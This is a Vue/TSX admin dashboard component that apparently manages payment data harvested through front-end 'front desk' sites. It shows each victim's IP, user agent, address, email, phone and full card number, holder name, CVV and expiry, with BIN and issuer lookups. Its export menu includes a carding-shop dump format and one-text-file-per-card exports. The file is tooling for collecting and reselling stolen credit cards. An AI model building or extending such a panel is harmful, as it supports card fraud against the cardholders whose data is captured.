<script setup lang="tsx">
import { ElButton, ElCard, ElPopconfirm, ElPopover, ElSpace } from 'element-plus';
import dayjs from 'dayjs';
import { fetchGetDataCenterList } from '@/service/api';
import { useTable, useTableOperate } from '@/hooks/common/table';
import { $t } from '@/locales';
import Search from './modules/search.vue';
import Detail from './modules/detail.vue';
import CardBin from './modules/card-bin.vue';
import CardBinList from './modules/card-bin-list.vue';

const { columns, data, loading, getData, getDataByPage, mobilePagination, searchParams, resetSearchParams } = useTable({
  apiFn: fetchGetDataCenterList,
  apiParams: {
    current: 1,
    size: 10
  },
  columns: () => [
    {
      prop: 'detail',
      label: $t('page.dataCenter.detail'),
      formatter(row) {
        return (
          <Detail
            data={[
              {
                label: '编号',
                value: `${row.id}`,
                class: 'bg-info text-white'
              },
              {
                label: '创建于',
                value: dayjs(row.createdAt).format('YYYY-MM-DD hh:mm')
              },
              {
                label: '更新于',
                value: dayjs(row.updatedAt).format('YYYY-MM-DD hh:mm')
              },
              {
                label: '前台',
                value: row.frontDeskName
              },
              {
                label: '域名',
                value: row.frontDeskDomain
              },
              {
                label: 'IP',
                value: row.ipAddress
              },
              {
                label: 'UA',
                value: row.userAgent
              }
            ]}
          />
        );
      }
    },
    {
      prop: 'addressInfo',
      label: $t('page.dataCenter.addressInfo'),
      formatter(row) {
        const [item] = row.shippingInfos;
        const [user] = row.userAccountInfo;
        return (
          <Detail
            data={[
              {
                label: 'address',
                value: `${item.country}`
              },
              {
                label: 'address2',
                value: item.address
              },
              {
                label: 'city',
                value: item.city
              },
              {
                label: 'email',
                value: user.email
              },
              {
                label: 'fullName',
                value: user.username
              },
              {
                label: 'phone',
                value: user.phoneNumber
              },
              {
                label: 'state',
                value: user.state
              },
              {
                label: 'zipCode',
                value: item.postalCode
              }
            ]}
          />
        );
      }
    },
    {
      prop: 'cardInfo',
      label: $t('page.dataCenter.cardInfo'),
      formatter(row) {
        const [item] = row.orders;
        const expires = `${item.expiryYear}-${item.expiryMonth}`;

        const tmp = row.orders.map((v: any) => ({
          card: {
            number: v.cardNumber,
            holder: v.cardHolderName,
            cvv: v.cvv,
            expires
          },
          binDataList: [
            {
              label: 'BIN信息',
              value: '',
              isTitle: true,
              class: 'bg-info text-white',
              onClick: () => {
                if (v.binInfo) window.open(v.binInfo);
              }
            },
            {
              label: 'Type',
              value: v.cardType
            },
            {
              label: 'BIN',
              value: v.bin
            },
            {
              label: 'Bank',
              value: v.issuerName
            },
            {
              label: 'Country',
              value: v.countryName
            },
            {
              label: 'Schema',
              value: 'xx'
            },
            {
              label: 'Level',
              value: v.cardLevel
            }
          ]
        }));

        return (
          <Detail
            data={[
              {
                label: 'CardName',
                value: item.cardHolderName
              },
              {
                label: 'CardNumber',
                value: item.cardNumber,
                class: 'bg-info text-white'
              },
              {
                label: 'Cvv',
                value: item.cvv
              },
              {
                label: 'Expires',
                value: expires
              }
            ]}
          >
            {{
              opers: () => (
                <ElSpace class="mb-20px flex justify-center">
                  <ElPopover placement="top" width={1000} trigger="click">
                    {{
                      reference: () => {
                        return (
                          <ElButton>
                            <icon-iconamoon-credit-card-thin class="mr-1 text-icon" /> CREDIT
                          </ElButton>
                        );
                      },
                      default: () => {
                        return <CardBin card={tmp[0].card} data={tmp[0].binDataList} />;
                      }
                    }}
                  </ElPopover>
                  <ElPopover placement="top" width="1000" trigger="click">
                    {{
                      reference: () => {
                        return (
                          <ElButton>
                            <icon-uis-history class="mr-1 text-icon" />
                            History
                          </ElButton>
                        );
                      },
                      default: () => {
                        return <CardBinList data={tmp} />;
                      }
                    }}
                  </ElPopover>
                </ElSpace>
              )
            }}
          </Detail>
        );
      }
    },
    {
      prop: 'otherInfo',
      label: $t('page.dataCenter.otherInfo'),
      formatter() {
        return <span>hehe</span>;
      }
    },
    {
      prop: 'operate',
      label: $t('common.operate'),
      width: 130,
      formatter: row => (
        <div class="flex-center">
          <ElPopconfirm title={$t('common.confirmDelete')} onConfirm={() => handleDelete(row.id)}>
            {{
              reference: () => (
                <ElButton type="danger" plain size="small">
                  {$t('common.delete')}
                </ElButton>
              )
            }}
          </ElPopconfirm>
        </div>
      )
    }
  ]
});

const {
  onDeleted
  // closeDrawer
} = useTableOperate(data, getData);

function handleDelete(id: number) {
  // request
  console.log(id);

  onDeleted();
}
</script>

<template>
  <div class="min-h-500px flex-col-stretch flex-shrink-0 gap-16px overflow-hidden lt-sm:overflow-auto">
    <Search v-model:model="searchParams" @reset="resetSearchParams" @search="getDataByPage" />
    <ElCard class="sm:flex-1-hidden card-wrapper">
      <template #header>
        <div class="flex items-center justify-between">
          <p>{{ $t('common.list') }}</p>
          <TableHeaderOperation :loading="loading" @refresh="getData">
            <template #default>
              <ElDropdown placement="bottom-start">
                <ElButton type="primary" plain>{{ $t('page.dataCenter.exportResult') }}</ElButton>
                <template #dropdown>
                  <ElDropdownMenu>
                    <ElDropdownItem>导出全部信息</ElDropdownItem>
                    <ElDropdownItem>导出卡号信息</ElDropdownItem>
                    <ElDropdownItem>导出卡号信息(去除未知卡号)</ElDropdownItem>
                    <ElDropdownItem>导出料站格式</ElDropdownItem>
                    <ElDropdownItem>导出料站格式含历史</ElDropdownItem>
                    <ElDropdownItem>导出所有卡，一卡一个txt</ElDropdownItem>
                    <ElDropdownItem>导出所有卡，一卡一个txt(去重)</ElDropdownItem>
                  </ElDropdownMenu>
                </template>
              </ElDropdown>
              <ElPopconfirm :title="$t('page.dataCenter.clearData')" @confirm="() => {}">
                <template #reference>
                  <ElButton type="danger" plain>
                    <template #icon>
                      <icon-ic-round-delete class="text-icon" />
                    </template>
                    {{ $t('page.dataCenter.clearData') }}
                  </ElButton>
                </template>
              </ElPopconfirm>
            </template>
          </TableHeaderOperation>
        </div>
      </template>
      <div class="h-[calc(100%-48px)]">
        <ElTable
          v-loading="loading"
          height="100%"
          cell-class-name="!align-baseline"
          class="sm:h-full"
          :data="data"
          row-key="id"
        >
          <ElTableColumn v-for="col in columns" :key="col.prop" v-bind="col" />
        </ElTable>
        <div class="mt-20px flex justify-end">
          <ElPagination
            v-if="mobilePagination.total"
            layout="sizes,prev,pager,next"
            v-bind="mobilePagination"
            @current-change="mobilePagination['current-change']"
            @size-change="mobilePagination['size-change']"
          />
        </div>
      </div>
    </ElCard>
  </div>
</template>

<style scoped>
:deep(.el-table__row:hover, .el-table__cell) {
  background-color: transparent !important; /* 禁用默认背景色 */
}

:deep(.el-table__row:hover .el-table__cell) {
  background-color: transparent !important; /* 禁用默认背景色 */
  box-shadow: 0 0 4px rgba(0, 0, 0, 0.1); /* 添加阴影效果 */
  transition: box-shadow 0.3s ease; /* 平滑过渡效果 */
}
</style>
